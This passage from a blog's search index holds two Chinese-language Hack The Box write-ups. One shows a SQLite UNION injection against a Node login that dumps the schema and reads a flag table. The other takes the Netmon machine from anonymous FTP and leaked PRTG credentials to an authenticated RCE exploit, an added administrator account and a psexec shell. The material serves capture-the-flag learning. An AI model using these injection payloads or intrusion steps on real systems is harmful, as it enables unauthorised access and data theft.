class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">`user <span class="subst">$&#123;req.data.username&#125;</span> doesn&#x27;t exist in our database.`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;index.html&#x27;</span>, &#123; user &#125;);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">next</span>(err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">getUser</span>(<span class="params">username</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> &#123;</span><br><span class="line">        db.<span class="title function_">get</span>(<span class="string">`SELECT * FROM users WHERE username = &#x27;<span class="subst">$&#123;username&#125;</span>&#x27;`</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="title function_">rej</span>(err);</span><br><span class="line">            <span class="title function_">res</span>(data);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>我要在<code>SELECT * FROM users WHERE username = '$&#123;username&#125;'</code>上下手，可以看出来，${username}是我可以操控的部分，不太熟悉SQL注入，接下来我进行了搜寻，但得到的反馈结果是<code>Error: SQLITE_ERROR: unrecognized token: &amp;quot;#&amp;quot;</code>，系统并不能正确地理解我的token，所以参考了 <a href="https://www.tariqhawis.com/htb-under-construction-web-challange/">这篇文章</a></p><p>对表单的列进行检索(用户名建议改用自己注册过的)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test<span class="string">&#x27; order by 10;--</span></span><br></pre></td></tr></table></figure><p><code>--</code>符号用于对后面的语句进行注释</p><blockquote><p>sqlite的注释符号有<code>--</code>和<code>/*</code></p></blockquote><p>得到反馈<code>Error: SQLITE_ERROR: 1st ORDER BY term out of range - should be between 1 and 3</code>,说明数据库表单只有3个列</p><p>由于只能显示用户名，所以我们的</p><p>接着<code>test1' AND 1=0 UNION SELECT 1,(SELECT group_concat(sql) FROM sqlite_master),3;--</code></p><p><code>AND 1=0</code> ：忽略了前面username = test的检索结果<br /><code>union</code> ：联合搜索结果<br /><code>group_concat()</code> ：可以将信息联合起来<br /><code>sqlite_master</code>是一个SQLite使用的系统表如下</p><ul><li>sqlite_master表单<ul><li>type记录类型</li><li>name记录项目名字</li><li>tbl_name记录从属表名</li><li>rootpage记录数据库页存储编号</li><li>sql记录创建项目的sql语句</li></ul></li></ul><p>如此我们可以得到服务器以下反馈信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Welcome CREATE TABLE &amp;quot;flag_storage&amp;quot; (</span><br><span class="line">&amp;quot;id&amp;quot;INTEGER PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">&amp;quot;top_secret_flaag&amp;quot;TEXT</span><br><span class="line">),CREATE TABLE sqlite_sequence(name,seq),CREATE TABLE &amp;quot;users&amp;quot; (</span><br><span class="line">&amp;quot;id&amp;quot;INTEGER,</span><br><span class="line">&amp;quot;username&amp;quot;VARCHAR(255) NOT NULL,</span><br><span class="line">&amp;quot;password&amp;quot;VARCHAR(255) NOT NULL,</span><br><span class="line">PRIMARY KEY(&amp;quot;id&amp;quot;)</span><br><span class="line">)&lt;br&gt;This site is under development. &lt;br&gt;</span><br><span class="line">Please come back later.</span><br></pre></td></tr></table></figure><p>最后使用如下语句可以得到flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; and 1=0 union select 1,(select top_secret_flaag from flag_storage),3;--</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL Injection </tag>
            
            <tag> JWT </tag>
            
            <tag> CVE-2015-9235 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB Netmon Machine Challenge</title>
      <link href="/2022/08/04/htb-netmon/"/>
      <url>/2022/08/04/htb-netmon/</url>
      
        <content type="html"><![CDATA[<h2 id="preface"><a class="markdownIt-Anchor" href="#preface"></a> Preface</h2><p>这是Hackthebox里面一个简单的机器，因为刚好用到这个机器并且决定写一个记录平时CTF的Writeup，故写下这篇文章。CyberSecure这些东西很多都很繁杂，光是靠脑袋是记不住的，有些东西得自己亲自写一遍或者手记一下过程，特别是能够自己独立分析漏洞，写下分析过程更有利于自己整理出思绪，博客更多也是给自己看的，所以就不弄图床来放图片演示了。</p><h2 id="enumeration"><a class="markdownIt-Anchor" href="#enumeration"></a> Enumeration</h2><p>首先进行对主机端口开放的情况进行探测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  -sC -sV Netmon.htb</span><br></pre></td></tr></table></figure><p>发现端口开放情况及其版本信息如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PORT    STATE SERVICE      VERSION</span><br><span class="line">21/tcp  open  ftp          Microsoft ftpd</span><br><span class="line">80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)</span><br><span class="line">135/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><p>nmap启动的脚本检测检测到FTP允许Anonymous匿名登录，尝试登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">└─$ ftp Anonymous@10.10.10.152</span><br><span class="line">Connected to 10.10.10.152.</span><br><span class="line">220 Microsoft FTP Service</span><br><span class="line">331 Anonymous access allowed, send identity (e-mail name) as password.</span><br><span class="line">Password: </span><br><span class="line">230 User logged in.</span><br><span class="line">Remote system type is Windows_NT.</span><br><span class="line">ftp&gt; dir</span><br><span class="line">229 Entering Extended Passive Mode (|||50149|)</span><br><span class="line">150 Opening ASCII mode data connection.</span><br><span class="line">02-03-19  12:18AM                 1024 .rnd</span><br><span class="line">02-25-19  10:15PM       &lt;DIR&gt;          inetpub</span><br><span class="line">07-16-16  09:18AM       &lt;DIR&gt;          PerfLogs</span><br><span class="line">02-25-19  10:56PM       &lt;DIR&gt;          Program Files</span><br><span class="line">02-03-19  12:28AM       &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">02-03-19  08:08AM       &lt;DIR&gt;          Users</span><br><span class="line">02-25-19  11:49PM       &lt;DIR&gt;          Windows</span><br></pre></td></tr></table></figure><h3 id="拿到用户组flag"><a class="markdownIt-Anchor" href="#拿到用户组flag"></a> 拿到用户组flag</h3><p>公开自己的C盘目录一个巨大的错误，尝试访问<code>Users\Administrator</code>无权限后，我们访问<code>Users\Public</code>文件夹，在里面可以拿到user.txt</p><h2 id="foothold"><a class="markdownIt-Anchor" href="#foothold"></a> Foothold</h2><h3 id="尝试80端口"><a class="markdownIt-Anchor" href="#尝试80端口"></a> 尝试80端口</h3><p>可以从nmap的版本嗅探中获取到80端口上运行的web服务是Paessler PRTG bandwidth monitor <code>18.1.37.13946</code>，登录到服务业，网页需要我们输入凭证进行身份验证，很明显我们并没有合法的凭据验证，所以我们尝试Google获取该服务默认安装凭证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User: prtgadmin</span><br><span class="line">Pass: prtgadmin</span><br></pre></td></tr></table></figure><p>不出意料的没有成功进入后台，目光回到含有大量可用信息的FTP服务，由于部分原因我决定将Linux上的80服务ssh反代理到本地Windows，仅用本地浏览器就可以进行访问被测主机内网80端口，需要用PowerShell运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssh kali@&#123;LAN_ip&#125; -L 8081:10.10.10.152:80</span><br><span class="line"></span><br><span class="line">available format:</span><br><span class="line">-L [bind_address:]port:host:hostport</span><br><span class="line">-L [bind_address:]port:remote_socket</span><br><span class="line">-L local_socket:host:hostport</span><br><span class="line">-L local_socket:remote_socket</span><br></pre></td></tr></table></figure><h3 id="寻找程序数据目录"><a class="markdownIt-Anchor" href="#寻找程序数据目录"></a> 寻找程序数据目录</h3><p>在之前我们已经发现主机是Windows Server 2008的系统，通过Google我发现了一下可用数据:<br /><strong>Windows Server 2012 (R2), Windows Server 2016, Windows 10, Windows 8.1, Windows 8, Windows 7, Windows Server 2008 R2:</strong></p><p><code>%programdata%\Paessler\PRTG Network Monitor</code></p><p><strong>Windows XP, Windows 2003:</strong></p><p><code>%ALLUSERSPROFILE%\Application data\Paessler\PRTG Network Monitor</code><br />通过配置文件用途介绍，我找到了最价值的内容：</p><blockquote><p>File Name:PRTG Configuration.dat<br />Format:XML<br />monitoring configuration (i.e. probes, groups, devices, sensors, users, maps, reports, etc.)</p></blockquote><p>描述中提到了 user,我们可能能够在其中找到进入PRTG的凭据，进入相关文件夹，目录显示如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">12-15-21  08:23AM       &lt;DIR&gt;          Configuration Auto-Backups</span><br><span class="line">08-04-22  04:02AM       &lt;DIR&gt;          Log Database</span><br><span class="line">02-03-19  12:18AM       &lt;DIR&gt;          Logs (Debug)</span><br><span class="line">02-03-19  12:18AM       &lt;DIR&gt;          Logs (Sensors)</span><br><span class="line">02-03-19  12:18AM       &lt;DIR&gt;          Logs (System)</span><br><span class="line">08-04-22  04:02AM       &lt;DIR&gt;          Logs (Web Server)</span><br><span class="line">08-04-22  04:07AM       &lt;DIR&gt;          Monitoring Database</span><br><span class="line">02-25-19  10:54PM              1189697 PRTG Configuration.dat</span><br><span class="line">02-25-19  10:54PM              1189697 PRTG Configuration.old</span><br><span class="line">07-14-18  03:13AM              1153755 PRTG Configuration.old.bak</span><br><span class="line">08-04-22  06:08AM              1722137 PRTG Graph Data Cache.dat</span><br><span class="line">02-25-19  11:00PM       &lt;DIR&gt;          Report PDFs</span><br><span class="line">02-03-19  12:18AM       &lt;DIR&gt;          System Information Database</span><br><span class="line">02-03-19  12:40AM       &lt;DIR&gt;          Ticket Database</span><br><span class="line">02-03-19  12:18AM       &lt;DIR&gt;          ToDo Database</span><br><span class="line">226 Transfer complete.</span><br></pre></td></tr></table></figure><p>最终在<code>PRTG Configuration.old.bak</code>找到了账户prtgadmin密码PrTg@dmin2018</p><h3 id="进入程序后台"><a class="markdownIt-Anchor" href="#进入程序后台"></a> 进入程序后台</h3><p>我们通过得到的凭据我们尝试进入后台，发现密码还是不对，可能是密码是从备份文件中找出的？管理员已经修改了他的密码，密码的2018与备份时间18年一致，而正在被使用的.dat文件时间显示是19年，我尝试了新密码PrTg@dmin2019，最终成功进入了后台。</p><p>先在终端运行<code>searchsploit &quot;prtg&quot;</code>看看是否有当前版本已经存在的漏洞得到了反馈结果<br /><code>PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution</code></p><h3 id="引用脚本"><a class="markdownIt-Anchor" href="#引用脚本"></a> 引用脚本</h3><p>我们在这里发现了已经有相关脚本可以对目标进行爆破，运行脚本，根据脚本的帮助信息我获取到了我登陆PRTG后的cookie，终端给脚本参数：</p><p><code>./&#123;script_name&#125;.sh -u http://netmon.htb/ -c &quot;&#123;your_auhthentic_cookie&#125;&quot;</code></p><p>运行后，脚本成功利用漏洞在系统创建了一个在Administrators组的账户，默认账户和密码分别是<code>pentest</code>和<code>P3nT3st!</code>,</p><h3 id="拿到root权限"><a class="markdownIt-Anchor" href="#拿到root权限"></a> 拿到root权限</h3><p>终端运行<code>smbmap -H netmon.htb -u pentest -p P3nT3st!</code>我们已经有了ADMIN$ 和 C$的RW权限</p><p>接下来用impacket-psexec以管理员身份进入目标主机的终端管理<br /><code>impacket-psexec &quot;pentest@netmon.htb&quot;</code></p>]]></content>
      
      
      <categories>
          
          <category> Machine </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2018-9276 </tag>
            
            <tag> RCE </tag>
            
            <tag> Weak Authentication </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
